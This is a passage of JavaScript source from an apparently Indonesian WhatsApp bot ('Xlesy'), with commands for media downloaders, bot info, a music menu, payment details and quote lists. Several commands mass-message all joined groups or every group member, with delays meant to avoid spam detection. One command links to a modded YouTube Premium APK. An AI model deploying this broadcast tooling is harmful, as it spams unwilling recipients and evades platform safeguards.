				if (!text.includes('tiktok.com')) return m.reply('Url Tidak Mengandung Result Dari Tiktok!')
				try {
					const hasil = await tiktokDl(text);
					m.reply(mess.wait)
					await m.reply({
						audio: { url: hasil.music_info.url },
						mimetype: 'audio/mpeg',
						contextInfo: {
							externalAdReply: {
								title: 'TikTok • ' + hasil.author.nickname,
								body: hasil.stats.likes + ' suka, ' + hasil.stats.comment + ' komentar. ' + hasil.title,
								previewType: 'PHOTO',
								thumbnailUrl: hasil.cover,
								mediaType: 1,
								renderLargerThumbnail: true,
								sourceUrl: text
							}
						}
					})
					setLimit(m, db)
				} catch (e) {
					m.reply('Gagal/Url tidak valid!')
				}
			}
			break
			case 'fb': case 'fbdl': case 'fbdown': case 'facebook': case 'facebookdl': case 'facebookdown': case 'fbdownload': case 'fbmp4': case 'fbvideo': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} url_facebook`, { quoted: fkontak1 })
				if (!text.includes('facebook.com')) return m.reply('Url Tidak Mengandung Result Dari Facebook!')
				try {
					const hasil = await facebookDl(text);
					if (hasil.results.length < 1) {
						m.reply('Video Tidak ditemukan!')
					} else {
						m.reply(mess.wait)
						await Xlesy.sendFileUrl(m.chat, hasil.results[0].url, `*🎐Title:* ${hasil.caption}`, m);
					}
					setLimit(m, db)
				} catch (e) {
					m.reply('Server downloader facebook sedang offline!')
				}
			}
			break
			case 'mediafire': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} https://www.mediafire.com/file/xxxxxxxxx/xxxxx.zip/file`, { quoted: fkontak1 })
				if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return m.reply('Url Invalid!')
				try {
					const anu = await mediafireDl(text)
					await Xlesy.sendMedia(m.chat, anu.link, decodeURIComponent(anu.name), `*MEDIAFIRE DOWNLOADER*\n\n*${setv} Name* : ${decodeURIComponent(anu.name)}\n*${setv} Size* : ${anu.size}`, m)
					setLimit(m, db)
				} catch (e) {
					m.reply('Server download sedang offline!')
				}
			}
			break
			case 'spotifydl': {
				if (!isLimit) return m.reply(mess.limit)
				if (!text) return m.reply(`Example: ${prefix + command} https://open.spotify.com/track/0JiVRyTJcJnmlwCZ854K4p`, { quoted: fkontak1 })
				if (!isUrl(args[0]) && !args[0].includes('open.spotify.com/track')) return m.reply('Url Invalid!')
				try {
					const hasil = await spotifyDl(text);
					m.reply(mess.wait)
					await m.reply({
						audio: { url: hasil.download },
						mimetype: 'audio/mpeg',
						contextInfo: {
							externalAdReply: {
								title: hasil.title,
								body: clockString(hasil.duration),
								previewType: 'PHOTO',
								thumbnailUrl: hasil.cover,
								mediaType: 1,
								renderLargerThumbnail: true,
								sourceUrl: text
							}
						}
					})
					setLimit(m, db)
				} catch (e) {
					m.reply('Server download sedang offline!')
				}
			}
			break
			
			//new Xlesy	
						
case 'infobot': {
    let uptime = process.uptime(); // Waktu bot berjalan dalam detik
    let cpuModel = os.cpus()?.[0]?.model || "Tidak diketahui"; // Model CPU
    let totalMem = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2) + " GB"; // RAM total
    let freeMem = (os.freemem() / 1024 / 1024 / 1024).toFixed(2) + " GB"; // RAM tersedia
    let platform = os.platform(); // Platform OS
    let nodeVersion = process.version; // Versi Node.js
    let scVersion = "Xlesy VIP"; // Versi SC bot

    let message = `*\`INFO BOT - Xlesy\`*
🔸 *Uptime:* ${Math.floor(uptime / 60)} Menit
🔸 *CPU:* ${cpuModel}
🔸 *RAM Total:* ${totalMem}
🔸 *RAM Tersedia:* ${freeMem}
🔸 *Platform:* ${platform}
🔸 *Node.js:* ${nodeVersion}
🔸 *Source Code:* ${scVersion}

🦖 _Sistem ini berjalan secara real-time menggunakan optimasi Event-Driven Architecture berbasis Node.js, memastikan respons yang cepat dan efisien dalam menangani berbagai perintah pengguna. SC Xlesy dirancang dengan struktur modular yang memungkinkan fleksibilitas tinggi dalam pengembangan fitur baru tanpa mengganggu sistem utama. Dengan pendekatan ini, setiap fitur dapat diperbarui atau ditambahkan secara dinamis, sehingga bot tetap relevan dan adaptif terhadap kebutuhan pengguna._

_Selain itu, untuk menjaga performa maksimal, bot ini menggunakan cache memory guna mengurangi beban server dan mempercepat pemrosesan data. Dengan pemanfaatan proses asinkron, bot dapat menangani banyak permintaan secara bersamaan tanpa mengalami keterlambatan atau bottleneck. Sistem ini juga mendukung load balancing, yang membantu menjaga stabilitas saat menangani volume pengguna yang tinggi._

_Dengan dukungan teknologi modern dan optimasi berkelanjutan, SC Xlesy tidak hanya cepat dan stabil tetapi juga aman dan scalable. Sistem ini dapat diperluas dengan integrasi API pihak ketiga, memungkinkan koneksi dengan berbagai layanan eksternal seperti database cloud, AI chatbot, sistem pembayaran, dan layanan autentikasi OTP. Semua fitur ini dirancang untuk memberikan pengalaman pengguna terbaik dengan efisiensi maksimal._

`;

    Xlesy.sendMessage(m.chat, { text: message }, { quoted: ftroli });
    break;
}						
case 'replay': {
    if (!isOwner) return m.reply('❌ Hanya owner yang bisa menggunakan perintah ini.', { quoted: fkontak1 });

    let args = m.text.split(' ');
    if (args.length < 3) return m.reply('⚠️ Format salah! Gunakan: *!balas/replay 628xxxxx pesan*', { quoted: fkontak1 });

    let target = args[1]; // Nomor atau ID grup
    let replyMessage = args.slice(2).join(' '); // Pesan yang akan dikirim

    if (target.includes('@g.us')) {
        // Jika target adalah grup
        await Xlesy.sendMessage(target, { text: replyMessage }, { quoted: fkontak1 });
        await m.reply(`✅ Pesan berhasil dikirim ke grup ${target}`, { quoted: fkontak1 });
    } else {
        // Jika target adalah nomor pribadi
        let targetNumber = target + '@s.whatsapp.net';
        await Xlesy.sendMessage(targetNumber, { text: replyMessage }, { quoted: fkontak1 });
        await m.reply('✅ Pesan berhasil dikirim ke ' + target, { quoted: fkontak1 });
    }
    break;
}
		case 'replay1': {  
    if (!isOwner) return m.reply('❌ Hanya owner yang bisa menggunakan perintah ini.',  
    { quoted: fkontak1 })  
  
    let args = m.text.split(' ')  
    if (args.length < 3) return m.reply('⚠️ Format salah! Gunakan: *!balas/replay 628xxxxx pesan*',  
    { quoted: fkontak1 })  
  
    let targetNumber = args[1] + '@s.whatsapp.net' // Nomor tujuan  
    let replyMessage = args.slice(2).join(' ') // Ambil pesan setelah nomor  
  
    await Xlesy.sendMessage(targetNumber, { text: replyMessage })  
    await m.reply('✅ Pesan berhasil dikirim ke ' + args[1],  
    { quoted: fkontak1 })  
    break  
}									
        case 'cekfitur': case 'carifitur': {
    // Membaca isi file Xlesy.js
    let fileContent = fs.readFileSync('Xlesy.js', 'utf8')

    // Mencari semua case yang terdaftar dalam bot
    let regex = /case\s+'([^']+)'/g;
    let matches = [...fileContent.matchAll(regex)]

    if (matches.length === 0) {
        return m.reply("❌ Tidak ada fitur yang terdaftar di bot!")
    }        

    // Jika pengguna tidak memasukkan kata kunci, tampilkan semua fitur
    if (!text) {
        let fiturList = matches.map((match, index) => `${index + 1}. ${match[1]}`, { quoted: fkontak1 }).join("\n")
        return m.reply(`🔍 *Daftar Semua Fitur yang Tersedia:*\n\n${fiturList}`, { quoted: fkontak1 })
    }

    // Jika pengguna memasukkan kata kunci, cari fitur yang sesuai
    let searchResults = matches
        .filter(match => match[1].toLowerCase().includes(text.toLowerCase()))
        .map((match, index) => `${index + 1}. ${match[1]}`, { quoted: fkontak1 })
        .join("\n")

    if (!searchResults) {
        return m.reply(`❌ _Fiur *${text}* tidak ada dalam daftar BOT_.`, { quoted: fkontak1 })
    }

    m.reply(`🔍 *Hasil Pencarian untuk:* "${text}"\n\n${searchResults}`, { quoted: fkontak1 })
}
break

case 'svsontact': {
    if (!m.quoted) return m.reply('Reply ke pesan yang ingin disimpan sebagai kontak.')
    if (!text) return m.reply('Tambahkan nama kontak setelah perintah, contoh: .svcontact Nama Kontak')

    let vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:${text}\nTEL;waid=${m.quoted.sender.split('@')[0]}:${m.quoted.sender.split('@')[0]}\nEND:VCARD`;

    let contactMessage = {
        displayName: text,
        vcard: vcard
    }

    await Xlesy.sendMessage(m.chat, { contacts: { displayName: text, contacts: [contactMessage] } }, { quoted: fkontak1 })
    m.reply(`Kontak ${text} berhasil disimpan.`,
    { quoted: fkontak1 })
}
break

const blacklistWords = ['anjing', 'babi', 'tolol', 'bangsat']; // Tambahkan kata-kata yang ingin dihapus
// Auto Delete Pesan Tertentu
if (m.message) {
    let textMessage = (m.type === 'conversation') ? m.message.conversation :
                      (m.type == 'imageMessage') ? m.message.imageMessage.caption :
                      (m.type == 'videoMessage') ? m.message.videoMessage.caption :
                      (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : '';

    if (textMessage) {
        let isBlacklisted = blacklistWords.some(word => textMessage.toLowerCase().includes(word));
        if (isBlacklisted) {
            await Xlesy.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.sender }});
            await Xlesy.sendMessage(m.chat, { text: `⚠️ Pesan dari @${m.sender.split('@')[0]} telah dihapus karena mengandung kata terlarang!`, mentions: [m.sender] },
            { quoted: fkontak1 })
        }
    }
}

case 'musicmenu': {
    await Xlesy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    let imagePath = './lib/media/image/menu2.jpg' // Path ke gambar lokal

    let textMessage = `❍───❍「 _*Xlesy Menuya*_  」❍───❍ 
╭──┈➤「 *MUSIC MENU* 」❍ 
│  ${setv} ${prefix}music1
│  ${setv} ${prefix}music2
│  ${setv} ${prefix}music3
│  ${setv} ${prefix}music4
│  ${setv} ${prefix}music5
│  ${setv} ${prefix}music6
│  ${setv} ${prefix}music7
│  ${setv} ${prefix}music8
│  ${setv} ${prefix}music9
│  ${setv} ${prefix}music10
╰──────┈➤
╭──┈➤「 *NOTE* 」❍ 
│ .playmusic _/(list menumsuicnya) untuk memulai music_
╰────────┈➤
     `
        let buttons = [
        { buttonId: ".menu", buttonText: { displayText: "Back To Menu" }, type: 1 }
    ]

    // Kirim gambar lokal + teks + tombol
    await Xlesy.sendButtonMsg(m.chat, {
        image: { url: imagePath }, // Menggunakan file lokal
        text: textMessage,
        footer: 'XlesyVIP',
        buttons: buttons
    }, { quoted: ftroli })
    await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
        }
            break
case 'playmusic': {
    let folderPath = './lib/media/lagu'; // Pastikan folder ini ada dan berisi file musik

    // Jika user tidak memasukkan nama file, tampilkan daftar lagu
    if (!text) {
        let files = fs.readdirSync(folderPath).filter(file => file.endsWith('.mp3'));
        if (files.length === 0) return m.reply('Tidak ada file musik yang tersedia.');
        
        let fileList = files.map(file => `- ${file.replace('.mp3', '')}`, { quoted: fkontak1 }).join('\n');
        return m.reply(`Silakan pilih lagu:\n${fileList}`, { quoted: fkontak1 });
    }

    let fileName = text + '.mp3'; // Menambahkan .mp3 secara otomatis
    let filePath = `${folderPath}/${fileName}`;

    if (!fs.existsSync(filePath)) return m.reply('File tidak ditemukan di folder yang ditentukan!');

    let fileBuffer = fs.readFileSync(filePath);

    await Xlesy.sendMessage(m.chat, {
        audio: fileBuffer,
        mimetype: 'audio/mp4', // Bisa juga 'audio/mpeg'
        ptt: false // Ubah ke true jika ingin dikirim sebagai voice note
    }, { quoted: fkontak1 });

}
break;

case 'restartbot': {
    if (!isCreator) return m.reply("❌ Kamu bukan pemilik bot!")
    m.reply(`♻️ *Restarting bot...*
    _Tunggu samapai selesai Tidak akan ada Pemberitahuan jikalau selsai jdi Anda ketik .menu/lainya agar muncul menu itu berarti proses restart sudah selesai_`,
    { quoted: fkontak1 })

    setTimeout(() => {
        process.exit() // Menutup proses bot, sehingga bisa restart otomatis jika menggunakan PM2 atau hosting
    }, 2000)
    }
    break
	
        case 'ytprem': case 'apkytprem': {
        m.reply('https://sfile.mobi/5nOLMBokOAZ',
        { quoted: fkontak1 })
        }
        break
 
         case 'mlnews': {
             await Xlesy.sendMessage(m.chat, { react: { text: '🔍', key: m.key } })
    const axios = require('axios')
    const cheerio = require('cheerio')

    const url = 'https://www.oneesports.gg/mobile-legends/';

    async function scrapeMLNews() {
        try {
            const { data } = await axios.get(url)
            const $ = cheerio.load(data)
            let articles = []

            $('.row.tab-box').each((index, element) => {
                let category = $(element).find('.cat-name').text().trim()
                let title = $(element).find('h2 a').text().trim()
                let link = $(element).find('h2 a').attr('href')
                let description = $(element).find('h3 p').text().trim()
                let author = $(element).find('.author').text().trim()
                let authorLink = $(element).find('.author').attr('href')
                let publishTime = $(element).find('span[data-publish-time]').text().trim()
                let image = $(element).find('img').attr('data-src')

                articles.push({
                    category,
                    title,
                    link,
                    description,
                    author,
                    authorLink,
                    publishTime,
                    image
                });
            });

            let message = ''
            articles.forEach(article => {
                message += `${article.title}\n${article.description}\n${article.link}\n\n`
            })

            if (!message) return m.reply('Tidak dapat menemukan berita Mobile Legends saat ini',
            { quoted: fkontak1 })

            m.reply(message)
        } catch (error) {
            console.error('Error fetching data:', error)
            m.reply('_Server sedan offline',
            { quoted: fkontak1 })
        }
    }

    scrapeMLNews()
        await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
}
break
case 'pay': case 'payment':  {
            await Xlesy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    let imagePath = './lib/media/image/Pay.png' // Gantilah dengan lokasi file yang benar

    let textMessage = `────┈➤ [ _*Xlesy Menu Pembayaran*_ ]─┈➤ 
╭─┴─┈➤─| *LIST VIA PAY 💳* |───❍ 
│ ${setv} _VIA DANA_
│ ${setv} _VIA GOPAY_
│ ${setv} _VIA OVO_
│ ${setv} _VIA PULSA_
│────❍ *NOMOR VIA PAY* ❍───❍
│ ${setv} _DANA : ${dana}_
│ ${setv} _GOPAY : ${gopay}_
│ ${setv} _OVO : ${ovo}_
│ ${setv} _PULSA : ${pulsa}_ 
╰─┬───❍ _NOTE_ ❍───❍
╭─┴─┈➤
│ ${setv} _JIKALAU SUDAH DI TF!_
│ _SILAHKAN KIRIM BUKTI TF📷_
│ _KE ONWER!.._
│──┈➤ *PERINGATAN*⚠️
│ ${setv} _JIKALAU TIDAK ADA BUKTI TF_
│ _INVALID_
╰───────────❍

`

    let buttons = [
        { buttonId: ".owner", buttonText: { displayText: "👤Owner" }, type: 1 }
    ]

    // Kirim gambar lokal + teks + tombol
    await Xlesy.sendButtonMsg(m.chat, {
        image: { url: imagePath }, // Menggunakan file lokal
        text: textMessage,
        footer: 'XlesyGxyenn',
        buttons: buttons
    }, { quoted: ftroli })
    await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
}
break   
//menu push 
case "setteksjpm": {
    if (!isOwner) return m.reply(msg.owner)
    if (text || m.quoted) {
        const newteks = m.quoted ? m.quoted.text : text
        await fs.writeFileSync("./database/teksjpm.js", newteks.toString())
        m.reply("Berhasil Mengganti Teks JPM ✅", { quoted: fkontak1 })
    } else {
        return m.reply(example("Gunakan reply/kirim teks\n\nUntuk melihat teks JPM saat ini, ketik *.teksjpm*"), { quoted: fkontak1 })
    }
}
break

case "teksjpm": {
    if (!isOwner) return m.reply(msg.owner)
    m.reply(fs.readFileSync("./database/teksjpm.js").toString())
}
break      
case "jpm": {
    await Xlesy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    // Hanya bisa digunakan di chat pribadi
    if (m.isGroup) return m.reply("Perintah ini hanya bisa digunakan di chat pribadi!", { quoted: fkontak1 });
    if (!isOwner) return m.reply(msg.owner);

    // Ambil daftar semua grup yang bot masuk
    let allGroups = await Xlesy.groupFetchAllParticipating();
    let groupIds = Object.keys(allGroups);

    // Ambil teks JPM dari file
    let teksJPM = fs.existsSync("./database/teksjpm.js") ? fs.readFileSync("./database/teksjpm.js").toString() : "";
    if (!teksJPM) return m.reply("Teks JPM belum diset. Gunakan perintah *.setteksjpm* untuk mengatur teks JPM!", { quoted: fkontak1 });

    let senderName = m.pushName || "Admin";
    let message = `${teksJPM}\n\n> ${senderName}`; // Format pesan JPM

    let successCount = 0;
    
    for (let groupId of groupIds) {
        try {
            await Xlesy.sendMessage(groupId, { text: message });
            successCount++;
            await new Promise(resolve => setTimeout(resolve, 5000)); // Delay agar tidak dianggap spam
        } catch (err) {
            console.error(`Gagal mengirim JPM ke grup: ${groupId}`, err);
        }
    }

    m.reply(`JPM berhasil dikirim ke ${successCount} grup! ✅`, { quoted: fkontak1 });
    await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break;   
case 'pushkontak': {
    await Xlesy.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    if (!m.isGroup) return m.reply('Perintah ini hanya bisa digunakan di dalam grup!',
    { quoted: fkontak1 })
    if (!isCreator) return m.reply(mess.owner)
    if (!text) return m.reply('Masukkan pesan yang ingin dikirim ke semua anggota grup!',
    { quoted: fkontak1 })

    let metadata = await Xlesy.groupMetadata(m.chat)
    let participants = metadata.participants.map(v => v.id)
    let senderName = m.pushName || 'Admin' // Nama pengirim (fallback ke 'Admin' jika tidak tersedia)
    
    let message = `${text}\n\n> Xlesy` // Format pesan dengan nama pengirim
    
    for (let user of participants) {
        await Xlesy.sendMessage(user, { text: message })
        await new Promise(resolve => setTimeout(resolve, 5000)) // Delay agar tidak dianggap spam
         }
    m.reply(`Pesan berhasil dikirim ke ${participants.length} anggota grup!`,
    { quoted: fkontak1 })
        await Xlesy.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
}
break

case 'pushkontak1': {
    if (!m.isGroup) return m.reply('Fitur ini hanya dapat digunakan di grup.',
    { quoted: fkontak1 })
    if (!isCreator) return m.reply('Hanya owner yang dapat menggunakan fitur ini.',
    { quoted: fkontak1 })

    try {
        const groupMetadata = await Xlesy.groupMetadata(m.chat)
        const participants = groupMetadata.participants

        if (!text) return m.reply('Silakan masukkan pesan yang ingin dikirim.',
        { quoted: fkontak1 })
        
        const pesan = text.trim() 
        let success = 0
        let failed = 0

        for (let member of participants) {
            const memberId = member.id 
            try {
                await Xlesy.sendMessage(memberId, { text: pesan, mentions: [memberId] })
                console.log(`Pesan berhasil dikirim ke: ${memberId}`, { quoted: fkontak1 })
                success++;
            } catch (error) {
                console.error(`Gagal mengirim pesan ke: ${memberId}`, error)
                failed++
            }
            await sleep(1000); // Delay 1 detik
        }

        m.reply(`Push pesan selesai.\n✅ Berhasil: ${success}\n❌ Gagal: ${failed}`,
        { quoted: fkontak1 })
    } catch (error) {
        console.error(error)
        m.reply('Terjadi kesalahan dalam mengambil metadata grup.',
        { quoted: fkontak1 })
    }
    break
}

case 'pushkontakid': {
    if (!isCreator) return m.reply('Fitur ini hanya dapat digunakan oleh owner.',
    { quoted: fkontak1 })

    const args = text.split('|')
    if (args.length < 2) return m.reply(`Gunakan format:\n${prefix}pushkontakid <id_grup>|<pesan>\n\nContoh:\n${prefix}pushkontakid 1234567890-123456789@g.us|Halo semua!`,
    { quoted: fkontak1 })

    const groupId = args[0].trim()
    const pesan = args[1].trim()

    try {
        const groupMetadata = await Xlesy.groupMetadata(groupId)
        const participants = groupMetadata.participants;

        let success = 0
        let failed = 0

        for (let member of participants) {
            const memberId = member.id
            try {
                await Xlesy.sendMessage(memberId, { text: pesan, mentions: [memberId] })
                console.log(`Pesan berhasil dikirim ke: ${memberId}`, { quoted: fkontak1 })
                success++
            } catch (error) {
                console.error(`Gagal mengirim pesan ke: ${memberId}`, error)
                failed++
            }
            await sleep(1000) // Delay 1 detik
        }

        m.reply(`Push pesan selesai.\n✅ Berhasil: ${success}\n❌ Gagal: ${failed}`,
        { quoted: fkontak1 })   
    } catch (error) {
        console.error(error)
        m.reply('Gagal mendapatkan metadata grup. Pastikan ID grup benar dan bot ada di dalam grup tersebut.',
        { quoted: fkontak1 })
    }
    break
}

			// Quotes Menu
			case 'quotessad': {
    const quotes = [
        "“Kadang, diam adalah cara terbaik untuk memberitahu bahwa kita sedang terluka.”",
        "“Tidak semua luka terlihat, tidak semua kesedihan bisa dijelaskan dengan kata-kata.”",
        "“Aku tersenyum bukan karena bahagia, tapi karena aku sudah terbiasa berpura-pura.”",
        "“Semakin kita peduli, semakin besar peluang untuk terluka.”",
        "“Terkadang, orang yang paling kamu cintai adalah orang yang paling menyakitimu.”",
        "“Aku baik-baik saja, adalah kebohongan terbesar yang sering aku ucapkan.”",
        "“Ketika seseorang berubah, itu bukan karena mereka ingin, tapi karena mereka lelah terluka.”",
        "“Tidak ada yang lebih menyakitkan selain berpura-pura bahagia ketika hatimu sedang hancur.”",
        "“Beberapa orang akan tetap tinggal dalam hatimu, meski mereka telah pergi dari hidupmu.”",
        "“Aku tidak marah karena kamu berbohong, aku marah karena aku tidak bisa mempercayaimu lagi.”",
        "“Hujan tahu bagaimana cara menyembunyikan air mata.”",
        "“Seseorang bisa tersenyum setiap hari, tetapi tetap memiliki hati yang hancur di dalam.”",
        "“Berhenti berharap adalah cara terbaik untuk menghindari kekecewaan.”",
        "“Kadang kita harus menerima bahwa beberapa orang hanya bagian dari cerita, bukan masa depan kita.”",
        "“Aku selalu ada saat kamu butuh, tapi kamu selalu hilang saat aku butuh.”",
        "“Mungkin aku hanya kesalahan dalam hidupmu, tapi bagiku kamu adalah kenangan yang tak bisa aku lupakan.”",
        "“Mencintai seseorang yang tidak mencintaimu kembali adalah bentuk tersulit dari patah hati.”",
        "“Jika mencintaimu adalah kesalahan, maka aku telah melakukan kesalahan yang sama berulang kali.”",
        "“Terkadang, orang yang paling kuat di luar adalah orang yang paling hancur di dalam.”",
        "“Kamu pergi tanpa alasan, meninggalkanku dengan seribu pertanyaan.”",
        "“Orang yang paling tersakiti adalah mereka yang paling banyak tersenyum.”",
        "“Ada saatnya aku lelah berpura-pura kuat.”",
        "“Jangan tanya kenapa aku berubah, tanya kenapa kamu tidak pernah peduli.”",
        "“Rasa sakit mengajarkanku bagaimana cara bertahan, tapi tidak mengajarkanku bagaimana cara melupakan.”",
        "“Aku berharap bisa kembali ke masa di mana aku tidak mengenalmu.”",
        "“Mungkin aku memang bukan siapa-siapa bagimu, tapi kamu adalah segalanya bagiku.”",
        "“Aku tidak butuh alasan untuk mencintaimu, tapi aku butuh seribu alasan untuk melupakanmu.”",
        "“Aku selalu memilihmu, tapi kamu selalu memilih orang lain.”",
        "“Bukan perpisahan yang menyakitkan, tapi kenangan yang tertinggal setelahnya.”",
        "“Seseorang pernah berkata padaku, ‘Jangan terlalu berharap’, tapi aku tidak mendengarkan.”"
    ];

    let randomQuote = quotes[Math.floor(Math.random() * quotes.length)]
    m.reply(`😢 *Quotes Sedih* 😢\n\n${randomQuote}`,
    { quoted: fkontak1 })
}
break
			
			case 'quotesislamic': {
    const quotes = [
        "“Sesungguhnya bersama kesulitan ada kemudahan.” (QS. Al-Insyirah: 6)",
        "“Janganlah kamu bersikap lemah, dan jangan (pula) bersedih hati, padahal kamulah orang-orang yang paling tinggi derajatnya jika kamu beriman.” (QS. Ali Imran: 139)",
        "“Allah tidak membebani seseorang melainkan sesuai dengan kesanggupannya.” (QS. Al-Baqarah: 286)",
        "“Dan bertawakallah kepada Allah. Cukuplah Allah sebagai Pelindung.” (QS. Al-Ahzab: 3)",
        "“Dan janganlah kamu berputus asa dari rahmat Allah.” (QS. Az-Zumar: 53)",
        "“Barang siapa bertakwa kepada Allah, niscaya Dia akan mengadakan baginya jalan keluar.” (QS. At-Talaq: 2)",
        "“Ketahuilah, hanya dengan mengingat Allah hati menjadi tenteram.” (QS. Ar-Ra'd: 28)",
        "“Mintalah pertolongan kepada Allah dengan sabar dan shalat.” (QS. Al-Baqarah: 153)",
        "“Dan Aku tidak menciptakan jin dan manusia melainkan supaya mereka menyembah-Ku.” (QS. Adz-Dzariyat: 56)",
        "“Tugas kita bukan untuk berhasil, tapi untuk berusaha. Karena di dalam usaha itulah kita menemukan dan belajar dari kegagalan.”",
        "“Jangan bangga dengan apa yang dunia berikan, tapi banggalah dengan apa yang Allah berikan kepadamu.”",
        "“Perbaiki hubunganmu dengan Allah, maka Allah akan memperbaiki hubunganmu dengan manusia.”",
        "“Siapa yang berjalan untuk mencari ilmu, Allah akan mudahkan jalannya menuju surga.” (HR. Muslim)",
        "“Harta tidak akan berkurang karena sedekah.” (HR. Muslim)",
        "“Jangan menjelaskan tentang dirimu kepada siapa pun, karena yang menyukaimu tidak butuh itu, dan yang membencimu tidak percaya itu.”",
        "“Allah tidak melihat bentuk tubuh dan harta kalian, tetapi Dia melihat hati dan amal kalian.” (HR. Muslim)",
        "“Sebaik-baik manusia adalah yang paling bermanfaat bagi manusia lain.” (HR. Ahmad)",
        "“Barang siapa berbuat kebaikan sebesar dzarrah, niscaya ia akan melihat balasannya.” (QS. Az-Zalzalah: 7)",
        "“Barang siapa yang bersungguh-sungguh, maka ia akan berhasil.”",
        "“Orang yang paling kuat adalah yang mampu menahan amarahnya.” (HR. Bukhari & Muslim)",
        "“Barang siapa yang beriman kepada Allah dan hari akhir, hendaklah ia berkata baik atau diam.” (HR. Bukhari & Muslim)",
        "“Shalat adalah tiang agama, siapa yang mendirikannya maka ia telah menegakkan agama.”",
        "“Jangan sibuk mencari kesalahan orang lain, perbaikilah dirimu sendiri terlebih dahulu.”",
        "“Kehidupan dunia hanyalah kesenangan yang memperdaya.” (QS. Al-Hadid: 20)",
        "“Cintailah seseorang karena Allah, bukan karena dunia, maka cintamu akan kekal selamanya.”",
        "“Ketika dunia menjauhimu, jangan bersedih, karena Allah selalu dekat denganmu.”",
        "“Sabar adalah kunci dari segala kesuksesan dalam kehidupan.”",
        "“Orang yang paling mulia di sisi Allah adalah yang paling bertakwa.” (QS. Al-Hujurat: 13)",
        "“Ketika kau kehilangan sesuatu, bersabarlah. Karena sesuatu yang lebih baik sedang menunggumu.”",
        "“Jangan takut miskin karena sedekah, karena sedekah tidak mengurangi harta, justru melipatgandakannya.”",
        "“Allah Maha Pengampun, maka janganlah berputus asa dari rahmat-Nya.”",
        "“Jangan iri dengan rezeki orang lain, karena Allah memberikan apa yang terbaik bagimu.”",
        "“Bersyukurlah dalam keadaan apapun, karena selalu ada hikmah di balik setiap kejadian.”"
    ];

    let randomQuote = quotes[Math.floor(Math.random() * quotes.length)]
    m.reply(`📖 *Quotes Islamic* 📖\n\n${randomQuote}`,
    { quoted: fkontak1 })
}
break
			
			case 'motivasi': {
				const hasil = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/kata-kata/motivasi.json');
				m.reply(pickRandom(hasil))
			}
			break
			case 'bijak': {
				const hasil = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/kata-kata/bijak.json');
				m.reply(pickRandom(hasil))			
			}
			break
			case 'dare': {
				const hasil = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/kata-kata/dare.json');
				m.reply(pickRandom(hasil))
			}
			break
			case 'quotes': {
				const res = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/kata-kata/quotes.json');
				const hasil = pickRandom(res);
				m.reply(`_${hasil.quotes}_\n\n*- ${hasil.author}*`,
				{ quoted: fkontak1 })
			}
			break
			case 'truth': {
				const hasil = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/kata-kata/truth.json');
				m.reply(`_${pickRandom(hasil)}_`,
				{ quoted: fkontak1 })
			}
			break
			case 'renungan': {
				const hasil = await fetchJson('https://raw.githubusercontent.com/Gxyenn/database/refs/heads/master/kata-kata/renungan.json');
				m.reply('', {
					contextInfo: {
						forwardingScore: 10,
						isForwarded: true,
						externalAdReply: {
							title: (m.pushName || 'Anonim'),
							thumbnailUrl: pickRandom(hasil),
							mediaType: 1,
							previewType: 'PHOTO',
							renderLargerThumbnail: true,
						}
					}
				}, { quoted: fkontak1 });
			}
			break
			case 'bucin': {
				const hasil = await fetchJson('https://raw.githubusercontent.com/Gxyenndev/database/refs/heads/master/kata-kata/bucin.json');
				m.reply(pickRandom(hasil))
			}
			break
			
			// Random Menu
						case 'mobil': {
    try {
        let anu = 'https://api.agungny.my.id/api/rmobil';
        await Xlesy.sendMessage(m.chat, { 
            image: { url: anu }, 
            caption: 'DONE!' 
        }, { quoted: fkontak1 });
    } catch (e) {
        m.reply('Terjadi kesalahan saat mengambil gambar!', { quoted: fkontak1 })
    }
}
break;  
						case 'cina': {
    try {
        let anu = 'https://api.agungny.my.id/api/ccina';
        await Xlesy.sendMessage(m.chat, { 
            image: { url: anu }, 
            caption: 'DONE!' 
        }, { quoted: fkontak1 });
    } catch (e) {
        m.reply('Terjadi kesalahan saat mengambil gambar!', { quoted: fkontak1 })
    }
}
break;
			case 'vietnam': {
    try {
        let anu = 'https://api.agungny.my.id/api/cvietnam';
        await Xlesy.sendMessage(m.chat, { 
            image: { url: anu }, 
            caption: 'DONE!' 
        }, { quoted: fkontak1 });
    } catch (e) {
        m.reply('Terjadi kesalahan saat mengambil gambar!', { quoted: fkontak1 })
    }
}
break;
			case 'jepang': {
    try {
        let anu = 'https://api.agungny.my.id/api/cjepang';
        await Xlesy.sendMessage(m.chat, { 
            image: { url: anu }, 
            caption: 'DONE!' 
        }, { quoted: fkontak1 });
    } catch (e) {
        m.reply('Terjadi kesalahan saat mengambil gambar!', { quoted: fkontak1 })
    }
}
break;
			case 'korea': {
    try {
        let anu = 'https://api.agungny.my.id/api/ckorea';
        await Xlesy.sendMessage(m.chat, { 
            image: { url: anu }, 
            caption: 'DONE!' 
        }, { quoted: fkontak1 });
    } catch (e) {
        m.reply('Terjadi kesalahan saat mengambil gambar!', { quoted: fkontak1 })
    }
}
break;
			case 'cecan': {
    try {
        let anu = 'https://api.agungny.my.id/api/cecan';
        await Xlesy.sendMessage(m.chat, { 
            image: { url: anu }, 
            caption: 'DONE' 
        }, { quoted: fkontak1 });
    } catch (e) {
